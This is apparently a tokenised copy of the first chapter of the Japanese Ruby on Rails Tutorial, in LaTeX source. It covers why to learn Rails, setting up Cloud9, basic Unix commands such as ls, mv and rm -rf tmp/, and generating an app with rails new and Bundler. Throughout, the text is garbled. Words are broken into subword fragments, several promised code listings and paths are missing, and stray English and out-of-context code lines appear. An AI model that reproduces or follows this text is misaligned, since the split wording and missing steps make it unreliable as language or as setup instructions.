▁ scaffold の 自動生成 コード に 頼 っている 限 り 、 コード 自動生成 の 達 人 には な れる かもしれませんが 、 Rails に関する 実 践 的な 知 識 は ほとんど 身 に 付き ません 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 より 実 践 的な 知 識 を 身 に つ け るために 、 S ca f fold と ほぼ 逆 の ア プロ ー チ で 開発 を 進め ていきます 。 具体的には 、 第 \ ref { cha : a _ toy _ app } ▁ 章 で 作成する 簡単な デ モ アプリ では scaffold を使います が 、\ emph { この チュートリアル } の 中 核 である 第 \ ref { cha : static _ pages } 章 以降 の サンプルアプリケーション から は 、 scaffold を 一 切 使 わ ずに 開発 を 進め ていきます 。
▁ scaffold ▁ を 使 わ ない 代わりに 、 開発 の 各 ステップ で 、 手 頃 な \ emph { 一 口 サイズ } の コードを 書い ても ら います 。 この 一 口 サイズ のコードは 、 無 理 なく 理解 できる 程 度 に シ ン プ ル で 、 かつ 、 ある程度 の 歯 ご た え と や り が い を 得られ るように 配 慮 して あります 。
▁ 各 ステップ で 理解 する 必要 のある コードの 量 は わずか ですが 、 こう した 理解 を 積 み 重 ね て い く ことで 、 最終的に Rails の 知 識 を 高 い レベル で 身 に つ け られ るように 構成 されています 。 この ように して 得 た 深 い 知 識 は 柔 軟 性 が 高 く 、 ど のような Web アプリ を作成する 時に も 応 用 が 効 きます 。
▁< n >< n >\ end { as id e }< n >< n >\ section { は じ め に } ▁% ▁( fold )< n >\ label { sec : in tr o d u c tion }< n >< n >
▁Ruby ▁on ▁Rails ▁( 単 に 「 Rails 」 と 呼 ぶ こともあります ) ▁ は 、 Ruby プログラミング 言語 で 記述 された 、 Web 開発 フレームワーク です 。
▁Ruby ▁on ▁Rails は 200 4 年 に デ ビュー して 以 来 、 急 速 に 成 長 して い き ました 。 現在 では 、 動的な Web アプリケーションを 開発 する フレームワーク として 、 最も 有 力 かつ 人 気 のある フレームワーク の 1 つ になっています 。
▁\ href { http :// a i rb n b . com /}{ A i rb n b }、\ href { http :// base ca m p . com /}{ Base ca m p }、\ href { http :// d is n e y . com /}{ D is n e y }、\ href { http :// github . com /}{ GitHub } , ▁\ href { http :// h ul u . com /}{ H ul u }、\ href { http :// k i c k start er . com /}{ K i c k start er }、\ href { http :// sh o p if y . com /}{ S h o p if y }、\ href { http :// t w it ter . com /}{ Twitter }、\ href { http :// y e ll o w pages . com /}{ Y e ll o w ▁P age s } など 多くの 企 業 で Rails が 採 用 されています 。
▁ 他にも 、\ href { http :// ent p . com /}{ E N T P } や \ href { http :// thoughtbot . com /}{ thoughtbot }、\ href { http :// p i v o t all a b s . com /}{ P i v o t al ▁ L a b s }、\ href { http :// hash r ock e t . com /}{ Hash r ock e t }、\ href { http :// www . h app y f un c or p . com /}{ H app y F un C or p } といった 、 Rails を 専 門 的に 扱 う 会 社 も 数 多く あります 。 また 、 Rails を 専 門 に した フ リ ー ラ ン ス の コ ン サ ル タ ン ト や イン スト ラ ク ター 、 開発者 については 数 え き れ ません 。
▁Rails が これ だけ 多く に 人 達 に 使われ ている のは な ぜ でしょう か 。
▁また 、 Rails の 設計 が 簡潔 で 美 しい ことも 、 Rails の 成功 を 支 え ている 秘 訣 の 1 つ です 。 これを 実現 できた のは 、 Rails の 背 後 で 動 い ている \ href { http :// ruby - lang . org /}{ Ruby } 言語 の 驚 異 的な 柔 軟 性 の おかげで す 。 具体的には 、 Web アプリケーションの 作成 に 特 化 した \ href { http :// en . w ikipedia . org / wiki / D o main _ S p ec if i c _ L an g u age } { D S L ▁( ドメイン 固 有 言語 ) } ▁ を ▁Ruby 言語 で 実装 している ことにより 、 HTML や データモデル の 生成 、 URL ▁ の ルーティング など 、 Web プログラミング で 必要な 多くの 作業 が 簡単 になります 。 その 結果 、 Rails を使用して アプリケーションを 開発 すると 、 コードが 簡潔 になり 、 読み や す く なります 。
▁さらに 、 Rails は 最新の Web テ ク ノ ロ ジ ー や フレームワーク 設計 に 素 早 く 適 応 しています 。
▁たとえば 、 Rails は 「 REST 」 という 設計 思 想 の 重要 性 を い ち 早 く 理解 し 、 対応 した フレームワーク の 1 つ です ▁( REST については 後 ほど 解説します )。
▁また 、 他の フレームワーク で 成功 を 収 め た 新しい 技術 があれば 、 Rails の 創 始 者 である \ href { http :// lo u d th in k ing . com /}{ David ▁ H e in e me i er ▁ H an s s on } ▁( D H H ) ▁ や \ href { http :// rubyonrails . org / core } { Rails の コア チ ー ム } は 、 そう した ア イ デ ア を 常に 積 極 的に 取り 入 れ ています 。
▁ 印 象 的な 例 として 、 かつ て 互 い に ラ イ バ ル の関係 に あった M erb と Rails と の 統合 が 挙 げ られます 。 この 統合 の 結果 、 Rails は M erb の モジュール 設計 や 安 定 した \ href { http :// en . w ikipedia . org / wiki / Application _ pro gra m m ing _ in ter fa ce } { API } 、 そして パ フ ォ ー マ ン ス の 向 上 など 多くの 恩 恵 を 受け ること が できました 。
▁最後に 、 Rails ▁ には 、 非常に 熱 心 で 多 様 な コ ミ ュ ニ テ ィ があります 。
▁Rails コ ミ ュ ニ テ ィ には 、 何 百 人 もの オープン ソース \ href { http :// c ontributor s . rubyonrails . org /}{ コ ン ト リ ビュー タ } や 、 多くの 参 加 者 で 賑 わ う \ href { http :// rails con f . com /}{ カ ン フ ァ レ ン ス } 、 膨 大 な 数 の \ href { https :// ruby gem s . org /}{ gem } ▁( ページネーション や 画像 アップロード といった 特定の 問題 を 解決 するための gem など ) 、 多くの 情報を 発 信 し 続 け る ブログ 、 掲 示 板 、 I R C があります 。
▁ このような 熱 心 で 多 様 な コ ミ ュ ニ テ ィ の おかげで 、 開発 中に 何らかの エラー に 遭 遇 した として も 、 エラーメッセージ を そのまま Google で 検索 する だけで 、 関連する ブログ 記事 や 掲 示 板 の ス レ ッ ド を た ち ど こ ろ に 見つけ ることができます 。
▁ これまで にも 、 驚 く ほど 多くの 初心者 が \ emph { Ruby ▁on ▁Rails チュートリアル } で 学 ん できた 実 績 があります 。 Web 開発 経験 の 少 ない 方 も 、 まず は 挑 戦 してみる の が よい と思います 。
▁ 学習 中に 知 識 不 足 を 実 感 する 箇所 が 出 てきた ら 、 この後 で ご 紹 介 する 資 料 で い つ でも 学 び 直 して から 先に 進め ば よい のです 。
▁ 「 チュートリアル を 2 回 通 して 行う 」 という 方法 も お勧め です 。 続けて もう一度 や っ てみると 、 1 回 目 のとき よりも ず っ と 知 識 が 身 に 付 いた ことを 実 感 できます し 、 2 度 目 には もっと 短 い 時間 で 終 え られ る でしょう 。
▁ コマンド
▁ 「 先に Ruby を 勉 強 して から Rails を学ぶ 方が 良い でしょう か ? 」 という 質 問 を よく 受け ます 。
▁この 質 問 への 回 答 ですが 、 読者 の 学習 スタイル や プログラミング 経験 次 第 で 異なる ため 、 一 口 には 言 え ません 。
▁Web 開発 を 最 初 から 体 系 的に 学 び たい 方 や 、 プログラミング の 経験 が 全 く ない 方は 、 や は り \ href { http :// p r a g pro g . com / book / lt p 2 / learn - to - pro gra m }{\ emph { Ruby を 最初に 学 んで お く } } の が よいでしょう 。 P e ter ▁C oo per の 『 \ href { http :// www . a mazon . com / g p / product / 14 30 2 23 6 3 4 }{\ emph { B e g in n ing ▁Ruby } } 』 が お勧め です 。
▁その 一方 で 、 これ から Rails で 開発 を 始 め よう と する 人 は 「 と に か く \ emph { Web アプリケーション } を 作り たい ! 」 と 考え ている ことが ほとんど なので 、 た った 1 つの Web ページ を作成する ために 分 厚 い Ruby 本 を 一 気 読み する 気 には な れ ない でしょう 。
▁ 本チュートリアル が 自分 に はまだ まだ 難 しい と 思 う 方 には 、\ href { http :// learn - rails . com / learn - ruby - on - rails . html }{\ emph { L e ar n ▁Ruby ▁on ▁Rails } } ▁( D an i e l ▁ K e h o e ) ▁ や \ href { http :// m b s y . co / 7 Z d c 7 } { O n e ▁Mon th ▁Rails } を 先に 学 んで お く と よいでしょう 。 どちら も まったく の 初心者 を 対象 と し ており 、\ emph { 本チュートリアル } よりも 敷居 が 低 く 設定 されています 。
▁ 本チュートリアル を 読み 終 え る 頃 には 、 取り 組 み 前 の 知 識 量 の 多 少 に か か わ らず 、 より 高度な Rails の 情報 源 を 理解 できるように な っている はずです 。
▁その 中 でも 特に お勧め の Rails の 情報 源 を 紹 介 します 。
▁\ href { http :// m b s y . co / 6 V Q 8 l } { Co de ▁S ch o ol } : ▁ プログラミング を 対 話 的に 学習 できる コース
▁\ href { http :// www . g o te al e a f . com / railstutorial } { T e al e a f ▁A ca de my } : ▁ オンライン で 受 講 できる Rails 開発 ブ ート キ ャ ン プ です 。 高度な 資 料 も 充 実 しています 。
▁\ href { http :// www . th in k f ul . com / a / railstutorial } { T h in k f ul } : ▁ プロ の エ ン ジ ニ ア と 組 んで プロジェクト ベース で 授 業 を 進め る オンライン クラス です 。
▁\ href { https :// p r a g ma tic st u d io . com / ref s / railstutorial } { P r a g ma tic ▁S t u d io } : ▁ M i ke ▁C l ar k と N i co le ▁C l ar k が 教 鞭 を 執 っている オンライン の Rails クラス です 。
▁20 06 年 に 筆者 が 受 講 した Rails の コース では 、 M i ke の 他 に \ emph { Pro gra m m ing ▁Ruby } の 著者 D a ve ▁ T h o ma s も 講 師 を 務 め ていました
▁\ href { http :// rails casts . com /}{ RailsCast s } ▁( Ryan ▁B at es ) ▁: ▁ 極めて 質 の 高 い ▁( ほぼ ) ▁ 無料 の スクリーンキャスト です 。
▁\ href { https :// tutorial s . rails app s . org / hartl } { Rails A p p s } : ▁ さまざまな Rails プロジェクト や チュートリアル が トピック 別 に 詳 しく 特 集 されています 。
▁\ href { http :// guides . rubyonrails . org /}{ Rails ガイド } : ▁ トピック 毎 に 分 類 された 最新の Rails リ フ ァ レ ン ス です ▁( 訳 注 : ▁Rails G u id es の 日 本 語 版 を 「 Rails ガイド 」 と 呼 んで います 。 )
▁ 本チュートリアルで 使用している 取り 決 め や 表 記 は 、 説明 不要な もの が ほとんど です 。
▁ここでは 、 説明 が 必要 と 思 わ れる もの について のみ 補 足 します 。
▁ 本チュートリアルで は 、 コマンドライン ▁( ターミナル ) ▁ の コマンド 例 が 多 用 されています 。
▁ 簡 素 化 の ため 、 次のような Unix スタイル の プロンプト ▁( 行 の 頭 に 「\ $ 」 を表示する スタイル ) ▁ を使用して 、 その 例 が コマンドライン であることを 示 しています 。
▁" hello ▁ world "
▁\ ref { sec : up _ and _ r un n ing } でも 述 べ ている ように 、 本チュートリアルで は Unix コマンドライン を 最 初 から 利用できる クラウド 開発環境 の 利用 ▁(\ ref { sec : development _ environment }) ▁ を 、 すべての OS ユーザー ▁( 特に Windows ) ▁ の 方 に お す す め しています 。
▁Rails には コマンドライン から 実行 する コマンド が 多 数 あるので 、 最 初 から コマンドライン が 利用できる クラウド は 非常に 便利です 。
▁たとえば 、\ ref { sec : rails _ server } では 以下の \ ko de { rails ▁ server } コマンドで ローカル development ▁Web サーバー を実行し ています 。
▁$ ▁ rails ▁ server
▁\ emph { Rails チュートリアル } における ディレクトリ の 区切 り は 、 コマンドライン の プロンプト と同様に Unix スタイル の ス ラ ッ シ ュ 「\ ko de { / }」 を使っています 。
▁たとえば 、 サンプルアプリケーション \ ko de { production . rb } の設定 ファイルは 以下のように 表 します
▁ このような ファイル パス は 、 アプリケーションの ルート ディレクトリ から の 相 対 パス である と 理解 してください 。 ルート ディレクトリ の 位 置 は システム によって 異 なり 、 この クラウド IDE ▁(\ ref { sec : development _ environment }) ▁ の場合 は以下のようになります 。
▁ / home / ub un t u / w or k space / sample _ app /
▁ この場合 、\ ko de { production . rb } への 絶 対 パス は以下のようになります 。
▁\ emph { Rails チュートリアル } では 、 様 々 な プログラム の 出力結果 ▁( シ ェ ル コマンド 、 バージョン管理 ツール 、 Ruby プログラム の 出力結果 など ) ▁ を こ ま め に 記 載 する ようにしています 。
▁ 出力結果 は 、 コンピュータ システム によって 微 妙 に 異なる ので 、 本チュートリアル の 出力結果 と 実際の 出力 が 正 確 に 一致する とは 限 り ません 。 しかし 、 こう した 細 か い 出力結果 の 差 異 が 問題 になる ことは ないので 、 それ ほど 気 に する必要はありません 。
▁ コンピュータ システム によって は 、 コマンド を実行し た 時に エラー が発生する かもしれません 。 しかし 本チュートリアルで は 、 あらゆる 場 面 を 想 定 して エラー 対策 を も れ なく 記 載 する ような \ href { http :// en . w ikipedia . org / wiki / S is y ph us } { 不 毛 な 作業 } は 行 って いません 。 そのような 場合は 、 即 座 に エラーメッセージ を Google で 検索 してください 。 エラーメッセージ を Google で 検索 すること は 、 実際の ソフトウェア 開発 でも 使われ ている 基本的な テクニック なので 、 よい 練 習 にも なります 。
▁ 本チュートリアル の チュートリアル を 進め て い く う ち に 何か 問題が生じ たら 、\ href { http :// www . railstutorial . org / # help } { Rails チュートリアル の ヘ ル プ } { p 1 } に記載されている リソース を ご 覧 ください 。
▁\ emph { Rails チュートリアル } では Rails アプリケーションの テスティング も 扱 っている ので 、 コード で どんな ことを すると テストスイート が 失敗 ▁( 赤 色 で 表示 ) し 、 どう すると テストスイート が パス ▁( 緑色 で 表示 ) ▁ するか を 実 地 で 学 べ る ようになっています 。
▁また 、 以下の 埋め込み Ruby は
▁ チュートリアル の 各 章 の最後 には 演習 問題 を 配置 しました 。 必 須 ではありません が 、 挑 戦 を お す す め します 。
▁ 本 編 と 演習 問題 を 分 け るために 、 その後 のコード リスト には 原 則 として 解 答 を 付け て いません 。
▁ 演習 の 解 答 が 少 ない 分 、 本 編 で 解 答 を 示す ようにしています 。
▁最後に 、\ emph { Ruby ▁on ▁Rails チュートリアル } で 使用されている 多くの サンプル コードを わかりやすく 記述 するために 、 2 つの 工 夫 を加え ました 。
▁1 つ は 、 コードの 重要な 部分 に ハ イ ラ イ ト を追加した ことです 。
▁ ハ イ ラ イ ト 行 は 通常 、 コード に追加 された 行 を示します が 、 その 前 に示した コード と の違い を 強 調 している ことも よく あります ▁( 常に という わけではありません が )。
▁2 つ 目 は 、 長 い コードの 途 中 を 次のように 垂 直 連 続 ドット で 省略 した ことです 。
▁has _ secure _ password
▁ 連 続 ドット は 省略 を表し ている ので 、 他の コード と 一 緒 に コピー しない よう ご注意ください
▁< n >< n > ▁% ▁ section ▁in tr o d u c tion ▁( end )< n >< n > ▁\ section { さ っ そ く 動か す } ▁% ▁( fold )< n > ▁\ label { sec : up _ and _ r un n ing }< n >< n >
▁Ruby を インストール し 、 Rails などの サポート ソフトウェア を 一 から すべて インストール する 練 習 は 、 たとえ ベ テ ラ ン Rails 開発者 にとって も 、 退 屈 な 作業 になる ことでしょう 。
▁ OS の違い 、 バージョン の違い 、 テキストエディタ の設定 の違い 、 IDE の違い など 、 環境 に ば ら つ き がある と 、 さまざまな 問題 が 複 合 して 発生 し てしまいます 。
▁ クラウド IDE は 普通 の Web ブラウザ の中で 実行 できる ため 、 プラットフォーム が 異 な って も 同じ ように 扱 え ます 。 この 特 長 は 、 ( Windows のような ) ▁Rails 開発環境 の 構 築 が 面倒 な OS では 特に 便利です 。
▁ 多 少 苦 労 しても 構 わ ないので ローカル P C 環境で \ emph { Ruby ▁on ▁Rails チュートリアル } を 学習 したい と お 考え の 方 には 、\ href { http :// install rails . com /}{ In st all Rails . com } { p 2 } に従って 環境 を 構 築 する ことをお勧めします 。 [ N I W A T A K O \_ TIP S ]
▁ Windows ユーザー は 、 In st all Rails で 推 奨 された 手順 に 従 った 場合 であっても 、 Rails イン スト ー ラ が 古 い という 警 告 が表示される 可能性があります 。 また 、 最新の チュートリアル と の 互 換 性 が 保 た れ ない 可能性 もあります 。
▁ 開発環境 は 、 Rails プ ログ ラ マ 一 人 ひ と り すべて 異なります 。 開発者 は 慣 れ て く る に従い 、 自分の 環境 を 徹 底 的に カスタマイズ する もの だ からです 。 開発環境 を 大 別 すると 、 テキストエディタ や コマンドライン を使う 環境 と 、 IDE ▁( 統合 開発環境 ) ▁ の 2 つ に 分 け られます 。
▁ そして \ emph { Ruby ▁on ▁Rails チュートリアル } では 、 複 雑 さ を避ける ために \ href { http :// c 9 . io /}{ Cloud 9 } という 素晴らしい クラウド IDE サービス を使って 進め ていきます 。
▁ 特に 今回の 第 3 版 では 、 Cloud 9 と 提 携 して 読者 の 皆 様 に チュートリアル 用 に 最適化 された 開発環境 を 提 供 できた ことを 心 から 嬉 しく 思 っています 。
▁この ように して 構 築 した Rails チュートリアル 用 Cloud 9 ワ ー ク スペース には 、 Ruby 、 RubyGems 、 Git など 、 プロ 級 の Rails 開発環境 に 必要な ソフトウェア が すべて 組 み 込 まれ ています 。
▁Rails だけ は インストール されていません が 、 これは もちろん チュートリアル のために 意 図 的に そう して あります ▁(\ ref { sec : install ing _ rails })。
▁この クラウド IDE には 他にも 、 Web 開発 に 必要な 三 種 の 神 器 である テキストエディタ 、 ファイル ブラウザ 、 コマンドライン ターミナル ▁( 図 \ ref { fig : id e _ an a to my }) ▁ も し っかり 組 み 込 んで あります 。
▁また 、 クラウド IDE の テキストエディタ では 、 Ruby ▁on ▁Rails の 大きな プロジェクト には 不 可 欠 とも 言 う べ き グ ロー バ ル ファイル 検索 も 利用 できます
▁たとえば 、\ ko de { foo } という名前の 関数 定義 を見つけ る には 、「 de f ▁ foo 」 を グ ロー バ ル 検索 します 。
▁最後に この クラウド IDE ですが 、 たとえ 今後 使う ことが ない として も ▁( 筆者 として も 、 他の エディタ の 使い 方 も ぜ ひ 知 っ ておく 必要がある と 考え ています ) 、 テキストエディタ などの 開発 ツール で 一般に どんな ことができる のか を 知 っ ておく には 最 適 です 。
▁ クラウド 開発環境 を 利用 するための 手順 は 次の とおりです 。
▁[ G o ▁to ▁your ▁D a sh b o ar d ] ▁ を クリック します 。
▁[ Create ▁ New ▁ or k space ] ▁ を 選択 します 。
▁ 図 \ ref { fig : c lo u d 9 _ new _ w or k space } に示したように 、「 rails - tutorial 」( 「 rails \_ tutorial 」 に \ emph { しない } よう ご注意ください ) ▁という ワ ー ク スペース 名を 入力 し 、[ P ri v at e ▁to ▁the ▁ people ▁I ▁in v it e ] ▁ を 選択 し 、 Rails チュートリアル の ア イ コ ン ▁( Ruby ▁on ▁Rails の ア イ コ ン では \ emph { ありません }) ▁ を設定します 。
▁[ Create ] ▁ を クリック します 。
▁ Cloud 9 で の ワ ー ク スペース の 準備 が完了し たら 、 ワ ー ク スペース を 選択 して ▁[ S t ar t ▁ edit ing ] ▁ を クリック します 。
▁Ruby の 世界 では 、 インデント に 2 つの スペース を使用する の が ほぼ 常 識 になっている ので 、 この エディタ の インデント 設定 も デフォルトの 4 から 2 に 変え ておく ことを お す す め します 。
▁ インデント 設定 を変更する には 、 右 上の 歯 車 ア イ コ ン をクリックして ▁[ Co de ▁ Edit or ▁( A ce ) ] ▁ を 選択 し 、[ S of t ▁ T a b s ] ▁ 設定 を開いて 編集 します ▁( 図 ▁\ ref { fig : c lo u d 9 _ two _ space s })。
▁ 設定 の 変更 は その 場 で 反 映 される ので 、[ S a ve ] ▁ ボタン を クリック する必要はありません 。
▁ Cloud 9 に 新しい ワ ー ク スペース を作成する 。
▁ Cloud 9 で インデント を スペース 2 つ に設定する 。
▁ 現 時点 の Cloud 9 に 含 まれ ている Rails のバージョン は 、 最新の チュートリアル より わずか に 古 く 、 互 換 性 が ありません 。 そのため 、 Rails を 手動で インストール する必要があります 。
▁なお 、 ローカル システム 上で 開発 する 場合は 普通 の ターミナル を使用します 。 クラウド IDE を 使用している 場合は 、 図 \ ref { fig : id e _ an a to my } の コマンドライン エ リ ア に 入力 します 。
▁ バージョン を指定して Rails を インストール する 。
▁ 文字列
▁ どんな Rails アプリケーション も 最初の 作成 手順 は 基本的に 同じです 。 \ ko de { rails ▁ new } コマンド を実行して 作成 します 。
▁この コマンド を実行する だけで 、 指定 の ディレクトリ に Rails アプリケーションの ス ケ ル ト ン を簡単に 作成 できます 。
▁\ ref { sec : development _ environment } で 推 奨 している Cloud 9 ▁ IDE を \ emph { 利用 しない } 場合は 、 Rails プロジェクト で使用する ための \ ko de { w or k space } ディレクトリ を作成して おいてください ▁( リスト ▁\ ref { code : m k d ir _ rails _ projects })。 ▁ directory ▁for ▁your ▁Rails ▁ projects ▁if ▁it ▁do es n ’ t ▁ al read y ▁ ex ist ▁and ▁the n ▁ change ▁in to ▁the ▁ directory .
▁Rails プロジェクト で使用する \ ko de { w or k space } ディレクトリ を作成する ( クラウド の場合は 不 要 )。
▁$ ▁ m k d ir ▁ w or k space
▁$ ▁ cd ▁ w or k space /
▁ 急 い で 学 び たい 人 のための Unix コマンドライン 講 座
▁ Windows ユーザー や Mac ▁ OS ▁X ユーザーの 多く は コマンドライン という もの に 馴 染 み がない ことでしょう ▁( Mac ▁ OS ▁X ユーザーの 方が ほ ん の わずか コマンドライン を 知 っている 人 は 多 い かもしれませんが )。
▁ 幸 い 、 今 は お す す め の クラウド 開発環境 の おかげで Unix コマンドライン を み な 同じ ように 扱 う ことができ 、\ href { http :// en . w ikipedia . org / wiki / S h e ll _ ( com put ing ) } { B a sh } などの 標準的な \ href { http :// en . w ikipedia . org / wiki / B a sh _ ( Unix _ sh e ll ) } { シ ェ ル コマンドライン インターフェイス } を 実行 できます ▁( 訳 注 : ▁ 「 シ ェ ル 」 とは 、 実際に 動く コマンド や プログラム に 「 か ぶ さ っている 」 インターフェイス と 考え ると よいでしょう )。
▁ コマンドライン の 基本的な 仕組み は 本当に シ ン プ ル です 。 ユーザー は コマンド を 発 行 ▁( issue ) ▁ することで 、 実 に さまざまな 操作 を 実行 できます 。 ディレクトリ の作成 なら \ text tt { m k d ir } コマンド 、 ファイルの 移動 や リ ネ ー ム は \ text tt { m v } コマンド 、 ファイルの コピー なら \ text tt { c p } コマンド 、 ファイル システム 内で の ディレクトリ の 移動 は \ text tt { cd } コマンド 、 という 具 合 です 。
▁ G U I ▁( グ ラ フ ィ カ ル ユーザー インターフェイス ) ▁ しか 使 った こと の ない ユーザー から すると 、 コマンドライン の 黒 い 画面 は 何 や ら 恐 ろ し げ で と っ つ き が 悪 い ように 見え る かもしれませんが 、 見 た 目 ほど 当 て に な らない もの はありません 。 コマンドライン は それ 自体 が 強力な ツール であり 、 エ ン ジ ニ ア にとって なく て は な らない 道 具 箱 な のです ▁( 訳 注 : ▁ 操作 を 誤 った とき の 被 害 も その 分 甚 大 ですが )。 そう で なければ 、 どう して エ ン ジ ニ ア が 揃 い も 揃 って コマンドライン を使う でしょう か 。
▁ 経験 豊 富 な 開発者 の デ ス ク ト ッ プ 画面 を 覗 き こ め ば 、 十 中 八九 ど こ ろ か 99 % は 、 黒 い ターミナル ウ ィ ンド ウ が い く つ も 開 き 、 そこで 多数の コマンドライン シ ェ ル が 忙 しく 実行 されている はずです 。
▁ コマンドライン について 話 し だ す とき り が ないので 深 入 り は しません が 、 本チュートリアルで 必要な Unix コマンドライン の コマンド は ほ ん の わずか しか ありません ので ご 安 心 ください ▁( 表 \ ref { table : un i x _ command s })。
▁ Unix の コマンドライン について もっと お 知 り になり たい 方は 、 M ar k ▁B at es 著 『 \ href { http :// con que r ing the command line . com /}{ \ emph { Co n que r ing ▁the ▁ Co m m and ▁ L in e } } 』 を ご 覧 ください 。 \ href { http :// con que r ing the command line . com / book } { 無料 の オンライン 版 } や \ href { http :// con que r ing the command line . com / # p ri c ing } { 電 子 書 籍 版 、 スクリーンキャスト } もあります 。
▁ ディレクトリ 内容 の 表示
▁$ ▁ l s ▁- l
▁ ディレクトリ の作成
▁ m k d ir ▁< ディレクトリ 名 >
▁ ディレクトリ の 移動
▁ cd ▁< ディレクトリ 名 >
▁上の ディレクトリ に 移動
▁$ ▁ cd ▁ . .
▁ ホ ー ム ディレクトリ に 移動
▁ ファイルの 移動 や リ ネ ー ム
▁ m v ▁< 移動 元 / 現在の 名前 > ▁< 移動 先 / 変更 後 の名前 >
▁$ ▁ m v ▁ README . rdoc ▁ README . m d
▁ ファイルの コピー
▁c p ▁< コピー 元 > ▁< コピー 先 >
▁$ ▁c p ▁ README . rdoc ▁ README . m d
▁ ファイルの 削除
▁ rm ▁< ファイル名 >
▁$ ▁ rm ▁ README . rdoc
▁ 空 の ディレクトリ の 削除
▁ rm d ir ▁< ディレクトリ 名 >
▁$ ▁ rm d ir ▁ w or k space /
▁ 中 身 のある ディレクトリ の 削除
▁ rm ▁- r f ▁< ディレクトリ 名 >
▁$ ▁ rm ▁- r f ▁t m p /
▁ cat ▁< ファイル名 >
▁ 主要な Unix コマンド 。
▁ ローカル システム または クラウド IDE で 行う 次の 手順 は 、 リスト \ ref { code : rails _ command } の コマンド を使用した 最初の アプリケーションの 作成 です 。
▁この ように バージョン を指定する ことで 、 リスト \ ref { code : install ing _ rails } と同じ バージョンの Rails で 、 最初の アプリケーション と同じ ファイル 構造 を作成する ことができます 。
▁( リスト \ ref { code : rails _ command } を実行すると 「 Co ul d ▁ not ▁ find ▁ ’ railties ' 」 という エラーが表示され る 場合は 、 インストール した Rails のバージョン が正しく ない 可能性があります 。 リスト \ ref { code : install ing _ rails } の とおり に コマンド を実行し た かどうかを 念 の ため ダ ブ ル チェック してください 。
▁\ ko de { rails ▁ new } を実行する ▁( バージョン 番号 を 指定 )。
▁create ▁ README . rdoc
▁create ▁ Rake file
▁create ▁config . r u
▁create ▁ . gitignore
▁create ▁ Gemfile
▁create ▁app
▁create ▁app / assets / javascripts / application . js
▁create ▁app / assets / stylesheets / application . css
▁create ▁app / controllers / application _ controller . rb
▁< n > ▁ .
▁run ▁bundle ▁install
▁ Y our ▁bundle ▁is ▁ com p let e !
▁ U s e ▁` bundle ▁ show ▁[ gem name ] ` ▁to ▁ s e e ▁ where ▁a ▁bundle d ▁gem ▁is ▁install ed .
▁リスト \ ref { code : rails _ command } の 下 の 方 にご注目ください 。 \ ko de { rails ▁ new } を実行すると 、 ファイル の作成 後に \ ko de { bundle ▁install } コマンド が自動的に 実行 されています 。
▁この bundle ▁install コマンド の 意味 については \ ref { sec : bundle r } の 最 初 で 詳 しく ご 説明します 。
▁ ご 覧 の とおり 、\ ko de { rails } コマンド を実行すると 大 量 の ファイル と ディレクトリ が 作成されます 。
▁Web アプリケーションの ディレクトリ を どう 構成 するか は 本 来 自 由 な のですが 、 Rails のような Web フレームワーク では ディレクトリ と ファイルの 構造 ▁( 図 \ ref { fig : directory _ structure _ rails }) ▁ はこの ように 標準 化 されています 。 その おかげで 、 ディレクトリ 構成 に 悩 む こと なく 、 実際に 動作する アプリケーションを 即 座 に ゼ ロ から 作成 できる のです 。
▁ ファイル / ディレクトリ 構造 が すべての Rails アプリ で 標準 化 されている おかげで 、 他の 開発者 の 書いた Rails のコード が 読み や す く なります 。 これは Web フレームワーク を 導入 する 大きな メ リ ッ ト です 。
▁Rails が デフォルトで 作成する ファイル については 表 \ ref { table : rails _ directory _ structure } を参照してください 。 これらの ファイル や ディレクトリ の 目的 については 本チュートリアル 全体 に 渡 って 説明 いた します 。
▁ 特に 、\ ref { sec : the _ asset _ pipeline } 以降 では Rails ▁ 3.1 の 新 機能 である \ ko de { アセットパイプライン } の一部 となる \ emph { app / assets } ディレクトリ について 詳 しく 説明します 。 アセットパイプライン によって 、 CSS ▁( C as c ad ing ▁S t y le ▁S h e e t ) ▁ や JavaScript ファイル などの アセット ▁( 資 産 ) ▁ を簡単に 編 成 したり デプロイ することができます 。
▁ 新規作成 された Rails アプリケーションの ディレクトリ 構造
▁ モデル 、 ビュー 、 コントローラ 、 ヘルパー など を含む 主要な アプリケーション コード
▁ アプリケーション で使用する CSS ▁( C as c ad ing ▁S t y le ▁S h e e t ) 、 JavaScript ファイル 、 画像 などの アセット
▁ バ イ ナ リ 実行 可能 ファイル
▁ アプリケーションの 設定
▁ データベース 関連 の ファイル
▁ doc /
▁ マ ニ ュ ア ル など 、 アプリケーションの ドキュメント
▁ ライブラリ モジュール
▁ ライブラリ で使用する CSS ▁( C as c ad ing ▁S t y le ▁S h e e t ) 、 JavaScript ファイル 、 画像 などの アセット
▁ アプリケーションの ログ ファイル
▁ エラー ページ など 、 一 般 ( Web ブラウザ など ) に 直接 公開 する データ
▁ コード 生成 、 コンソール の 起動 、 ローカル の Web サーバ の 立 ち 上 げ など に 使用する Rails スクリプト
▁ アプリケーションの テスト
▁ 一時 ファイル
▁ サ ー ド パ ー テ ィ の プラグイン や gem など
▁ サ ー ド パ ー テ ィ の プラグイン や gem で使用する CSS ▁( C as c ad ing ▁S t y le ▁S h e e t ) 、 JavaScript ファイル 、 画像 などの アセット
▁ アプリケーションの 簡単な 説明 ▁( 訳 注 : ▁ 近 年 は ▁ . rdoc よりも ▁ . m d ▁ ファイルの 方が よく 使われ ている よう です )
▁\ ko de { rake } コマンドで 使用 可能な タスク
▁この アプリケーションに 必要な G e m の 定義ファイル
▁ アプリケーションの すべての コピー が 同じ gem のバージョン を 使用している ことを確認 するために 使用される gem の リスト
▁\ href { http :// rack . github . io /}{ Rack ミドルウェア } 用の 設定 ファイル
▁ Git に 取り 込 み たくない ファイル を指定する ための パターン
▁ デフォルトの Rails フォルダ 構造 まとめ 。
▁Rails アプリケーションを 新規作成 した ら 、 次 は \ emph { Bundler } を実行して 、 アプリケーションに 必要な gem を インストール および インクルード します 。
▁\ ref { sec : the _ hello _ application } でも 簡単に 説明したように 、 Bundler は \ ko de { rails } によって自動的に 実行 ▁( この場合は \ ko de { bundle ▁install }) ▁ されます 。 ここでは デフォルトの アプリケーション gem を変更 して Bundler を 再度 実行 してみます 。
▁( クラウド IDE の場合は 、 ファイル ナ ビ ゲ ー ター で 矢 印 をクリックして サンプル アプリ の ディレクトリ を 開 き 、\ ko de { Gemfile } ア イ コ ン を ダ ブ ル クリック します )。
▁ Gemfile の内容 は 、 だ いた い 図 \ ref { fig : c lo u d 9 _ gemfile } や リスト \ ref { code : default _ gemfile } のようになります 。 バージョン 番号 など 細 か な 点 で 多 少 の違い がある かもしれません 。
